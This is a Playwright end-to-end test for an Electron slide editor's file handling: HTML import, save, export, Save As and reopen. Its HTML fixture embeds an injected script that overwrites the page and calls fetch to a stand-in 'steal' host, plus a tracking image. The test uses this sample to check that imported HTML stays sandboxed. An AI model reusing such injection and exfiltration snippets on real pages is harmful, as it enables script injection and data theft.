import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { mkdir, mkdtemp, readFile, writeFile } from 'node:fs/promises';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { _electron } from 'playwright-core';

const root = dirname(dirname(fileURLToPath(import.meta.url)));
const artifacts = join(root, 'test-artifacts', 'file-io');
await mkdir(artifacts, { recursive: true });
const directory = await mkdtemp(join(artifacts, 'run-'));
const htmlPath = join(directory, 'single-file.html');
const jsonPath = join(directory, 'saved.auralide.json');
const exportedPath = join(directory, 'exported.html');
const savedAsPath = join(directory, 'save-as.html');
const source = `<!doctype html><html lang="zh"><head><meta charset="utf-8"><title>多页创作</title><style>
body{margin:0}.slide{position:relative;width:1280px;height:720px;background:#fff;color:#172033;display:none}
.slide:first-of-type{display:block}h1{position:absolute;left:80px;top:100px;margin:0;font-size:54px}
.shape{position:absolute;left:80px;top:260px;width:280px;height:160px;background:#3568d4}
</style></head><body><section class="slide"><h1>第一页 · HTML 导入</h1><div class="shape"></div></section>
<section class="slide"><h1>第二页 · 保持可编辑</h1><p style="position:absolute;left:80px;top:240px">单文件多页</p></section>
<script>document.body.innerHTML='PWNED';fetch('https://example.invalid/steal')</script><img src="https://example.invalid/track"></body></html>`;
await writeFile(htmlPath, source);
const checks = [];
const check = (name, actual, expected = true) => {
  assert.deepEqual(actual, expected, name);
  checks.push(name);
  console.log('ok ' + name);
};
const env = { ...process.env };
delete env.ELECTRON_RUN_AS_NODE;
delete env.AURALIDE_DEV_SERVER_URL;
let app;
let page;
const launch = async () => {
  app = await _electron.launch({
    args: ['.', '--auralide-visual-test', '--user-data-dir=' + join(directory, 'profile')],
    cwd: root,
    env,
  });
  page = await app.firstWindow();
  await page.getByTestId('document-text-input').waitFor();
  await page.waitForFunction(
    () =>
      document.querySelector('[data-testid="demo-workspace"]')?.getAttribute('aria-busy') ===
      'false',
  );
};
const dialogs = async (open, save, response = 1) =>
  app.evaluate(
    ({ dialog }, values) => {
      dialog.showOpenDialog = async () => ({
        canceled: values.open === null,
        filePaths: values.open ? [values.open] : [],
      });
      dialog.showSaveDialog = async () => ({
        canceled: values.save === null,
        filePath: values.save ?? undefined,
      });
      dialog.showMessageBox = async () => ({ response: values.response, checkboxChecked: false });
      dialog.showMessageBoxSync = () => 1;
    },
    { open, save, response },
  );
const invoke = (operation) =>
  page.evaluate(async (operation) => {
    const document = await window.auralide.getDocument();
    return window.auralide[operation]({ expectedRevision: document.revision });
  }, operation);
const value = () => page.evaluate(() => window.auralide.getDocument());
const edit = (text) =>
  page.evaluate(async (text) => {
    const doc = await window.auralide.getDocument();
    const slide = doc.slides[0],
      element = slide.elements.find((el) => el.kind === 'text');
    return window.auralide.applyCommand({
      operation: 'element.updateText',
      target: { kind: 'element', slideId: slide.id, elementId: element.id },
      payload: { text },
      expectedRevision: doc.revision,
      origin: { kind: 'human' },
    });
  }, text);
const destroy = async () => {
  if (!app) return;
  await app
    .evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().forEach((w) => w.destroy()))
    .catch(() => {});
  await app.close().catch(() => {});
  app = undefined;
};

try {
  await launch();
  await app.evaluate(({ app }) => {
    globalThis.htmlGuests = [];
    app.on('web-contents-created', (_event, contents) => {
      contents.once('did-finish-load', async () => {
        if (!contents.getURL().startsWith('data:text/html')) return;
        globalThis.htmlGuests.push(
          await contents.executeJavaScript(
            "({bridge:typeof window.auralide,node:typeof process,require:typeof require,pwned:!document.querySelector('h1'),frames:window.frames.length})",
          ),
        );
      });
    });
  });
  await dialogs(htmlPath, jsonPath, 0);
  const initial = await value();
  check('declining HTML conversion cancels', (await invoke('importHtml')).error?.code, 'cancelled');
  check('declining conversion preserves current document', await value(), initial);
  await dialogs(htmlPath, jsonPath);
  const imported = await invoke('importHtml');
  check('real isolated HTML import succeeds', imported.ok);
  check(
    'HTML guest has no Node or privileged bridge',
    await app.evaluate(
      () =>
        globalThis.htmlGuests.every(
          (g) =>
            g.bridge === 'undefined' &&
            g.node === 'undefined' &&
            g.require === 'undefined' &&
            !g.pwned,
        ) && globalThis.htmlGuests.length > 0,
    ),
  );
  check('hidden second slide converted', imported.value.document.slides.length, 2);
  check(
    'source script did not execute',
    imported.value.document.slides[0].elements.some((el) => el.text?.includes('HTML 导入')),
  );
  check(
    'import is dirty and unbound',
    await page
      .evaluate(() => window.auralide.getDocumentStatus())
      .then((s) => [s.dirty, s.fileName]),
    [true, null],
  );
  check(
    'conversion loss reported before acceptance',
    imported.value.importReport.warnings.some((w) => w.includes('脚本')),
  );
  check(
    'conversion mapping matches stable IDs',
    imported.value.importReport.mappings.length,
    imported.value.importReport.elementCount,
  );
  const sourceHash = createHash('sha256').update(source).digest('hex');
  const userData = await app.evaluate(({ app }) => app.getPath('userData'));
  check(
    'exact original bytes retained',
    await readFile(join(userData, 'html-imports', sourceHash + '.html'), 'utf8'),
    source,
  );
  check('source original untouched', await readFile(htmlPath, 'utf8'), source);
  check('imported object editable through Core', (await edit('磁盘重开后仍在')).ok);
  check('first real save succeeds', (await invoke('saveDocument')).ok);
  const saved = JSON.parse(await readFile(jsonPath, 'utf8'));
  check(
    'Core edit written to disk',
    saved.slides[0].elements.some((el) => el.text === '磁盘重开后仍在'),
  );
  await edit('导出不能清除脏状态');
  await dialogs(htmlPath, exportedPath);
  check('HTML export succeeds', (await invoke('exportHtml')).ok);
  check(
    'export preserves active binding and dirty state',
    await page
      .evaluate(() => window.auralide.getDocumentStatus())
      .then((s) => [s.dirty, s.fileName]),
    [true, 'saved.auralide.json'],
  );
  const exported = await readFile(exportedPath, 'utf8');
  const viewerReady = app.waitForEvent('window');
  await app.evaluate(async ({ BrowserWindow }, path) => {
    const viewer = new BrowserWindow({
      show: false,
      webPreferences: { sandbox: true, contextIsolation: true, nodeIntegration: false },
    });
    await viewer.loadFile(path);
  }, exportedPath);
  const viewer = await viewerReady;
  await viewer.waitForFunction(() => document.getElementById('counter')?.textContent === '1 / 2');
  await viewer.getByRole('button', { name: '下一页', exact: true }).click();
  check(
    'exported HTML player navigates offline',
    await viewer.locator('#counter').textContent(),
    '2 / 2',
  );
  await app.evaluate(({ BrowserWindow }) =>
    BrowserWindow.getAllWindows()
      .find((w) => !w.isVisible())
      ?.destroy(),
  );
  check(
    'export embeds current Core snapshot',
    JSON.parse(exported.match(/id="auralide-document">(.*?)<\/script>/s)[1]).document,
    await value(),
  );
  await dialogs(null, null);
  const beforeCancel = await value();
  check('Save As cancellation typed', (await invoke('saveDocumentAs')).error?.code, 'cancelled');
  check('cancellation preserves in-memory content', await value(), beforeCancel);
  await dialogs(null, join(directory, 'missing', 'cannot-save.json'));
  check('Save As write failure returned', (await invoke('saveDocumentAs')).ok, false);
  check(
    'failed Save As preserves binding',
    (await page.evaluate(() => window.auralide.getDocumentStatus())).fileName,
    'saved.auralide.json',
  );
  await writeFile(jsonPath, 'external change');
  await dialogs(null, jsonPath);
  check(
    'Save As same path refuses external conflict',
    (await invoke('saveDocumentAs')).error?.code,
    'file-changed',
  );
  check('external bytes not overwritten', await readFile(jsonPath, 'utf8'), 'external change');
  await dialogs(null, savedAsPath);
  check('Save As HTML binds new file', (await invoke('saveDocumentAs')).ok);
  check(
    'Save As changes binding and clears dirty',
    await page
      .evaluate(() => window.auralide.getDocumentStatus())
      .then((s) => [s.dirty, s.fileName]),
    [false, 'save-as.html'],
  );
  await edit('HTML 后续保存');
  check('Save updates bound HTML', (await invoke('saveDocument')).ok);
  await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].close());
  await app.close().catch(() => {});
  app = undefined;
  await launch();
  await dialogs(savedAsPath, jsonPath);
  const reopened = await invoke('openDocument');
  check('saved HTML reopens after real window close and app restart', reopened.ok);
  check(
    'HTML metadata round trip preserves content',
    reopened.value.document.slides[0].elements.some((el) => el.text === 'HTML 后续保存'),
  );
  check(
    'native HTML reopen clean',
    (await page.evaluate(() => window.auralide.getDocumentStatus())).dirty,
    false,
  );
  await page.getByRole('button', { name: '读取最新', exact: true }).click();
  await page.getByTestId('document-text-input').fill('未应用的草稿');
  await page.getByRole('button', { name: '文件', exact: true }).click();
  await page.getByRole('button', { name: /另存为/ }).click();
  await page.waitForFunction(() => document.activeElement?.textContent === '取消');
  check(
    'draft prompt has safe initial keyboard focus',
    await page
      .getByRole('button', { name: '取消', exact: true })
      .evaluate((el) => el === document.activeElement),
  );
  await page.keyboard.press('Escape');
  check(
    'draft prompt Escape restores file trigger',
    await page
      .getByRole('button', { name: '文件', exact: true })
      .evaluate((el) => el === document.activeElement),
  );
  check(
    'cancelled draft prompt preserves text',
    await page.getByTestId('document-text-input').inputValue(),
    '未应用的草稿',
  );
  await page.getByTestId('document-text-input').press('Escape');
  await page.getByRole('button', { name: '文件', exact: true }).click();
  await app.evaluate(({ BrowserWindow }) =>
    BrowserWindow.getAllWindows()[0].setContentSize(1280, 800),
  );
  await page.waitForFunction(() => window.innerWidth === 1280 && window.innerHeight === 800);
  await page.screenshot({ path: join(artifacts, 'file-menu-1280x800.png') });
  await page.getByRole('button', { name: '取消', exact: true }).click();
  for (const [width, height] of [
    [1280, 800],
    [1440, 900],
  ]) {
    await app.evaluate(
      ({ BrowserWindow }, size) => BrowserWindow.getAllWindows()[0].setContentSize(...size),
      [width, height],
    );
    await page.waitForFunction(
      ([width, height]) => window.innerWidth === width && window.innerHeight === height,
      [width, height],
    );
    check(
      `no app scroll ${width}x${height}`,
      await page.evaluate(
        () =>
          document.documentElement.scrollWidth <= window.innerWidth &&
          document.documentElement.scrollHeight <= window.innerHeight,
      ),
    );
    await page.screenshot({ path: join(artifacts, `html-import-${width}x${height}.png`) });
  }
  await page.locator('[data-workspace="aura"]').click();
  await page.waitForFunction(async () => {
    const tabs = await window.auralide.auraInvoke({ tool: 'browser.listTabs', input: {} });
    return tabs.ok && tabs.value.some((t) => t.mode === 'slide-preview');
  });
  check('reopened document reaches native Aura preview', true);
  await page.locator('[data-workspace="editor"]').click();
  await edit('新建取消前的修改');
  const beforeNew = await value();
  await dialogs(null, null, 0);
  check(
    'New cancellation preserves unsaved changes',
    (await invoke('newDocument')).error?.code,
    'cancelled',
  );
  check('New cancellation keeps document', await value(), beforeNew);
  await dialogs(null, null);
  check(
    'New creates real blank document',
    (await invoke('newDocument')).value.document.slides[0].elements.length,
    0,
  );
  check(
    'New is dirty and unbound',
    await page
      .evaluate(() => window.auralide.getDocumentStatus())
      .then((s) => [s.dirty, s.fileName]),
    [true, null],
  );
  await writeFile(
    join(artifacts, 'file-io.json'),
    JSON.stringify(
      { passed: true, platform: process.platform, arch: process.arch, checks },
      null,
      2,
    ),
  );
  console.log(`file-io: ${checks.length} PASS`);
} finally {
  await destroy();
}
